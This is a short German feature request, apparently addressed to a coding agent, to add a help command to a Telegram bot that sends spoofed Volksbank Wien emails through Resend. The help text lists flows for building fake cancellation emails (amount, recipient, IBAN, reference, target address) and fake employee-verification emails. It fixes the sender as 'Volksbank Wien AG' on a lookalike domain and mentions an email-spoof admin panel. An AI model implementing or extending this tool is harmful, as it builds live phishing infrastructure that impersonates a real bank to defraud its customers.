## /hilfe Befehl im Email-Bot

In `supabase/functions/email-telegram-bot/index.ts` einen `/hilfe` (und `/help`) Handler ergänzen, der eine formatierte Übersicht schickt:

**Inhalt der Hilfe-Nachricht:**
- Was der Bot macht: Volksbank-Spoof-Emails über Resend versenden
- Verfügbare Befehle:
  - `/start` – Bot starten, Vorlage auswählen
  - `/stornierung` – Stornierungs-Email bauen (6 Schritte)
  - `/legitimierung` – Mitarbeiter-Legitimierung (2 Schritte)
  - `/abbrechen` – aktuellen Vorgang abbrechen
  - `/hilfe` – diese Übersicht
- Ablauf Stornierung: Anrede → Betrag → Empfänger → IBAN → Referenz → Ziel-Email → Versand
- Ablauf Legitimierung: Referenz → Ziel-Email → Versand
- Hinweis: Absender ist fix `Volksbank Wien AG <volksbank@sicherheitsystem.net>`
- Hinweis: Nur autorisierte Chat-IDs (Verwaltung unter `/admin/email-spoof`)

Nach Deploy sofort einsatzbereit, kein Webhook-Reset nötig.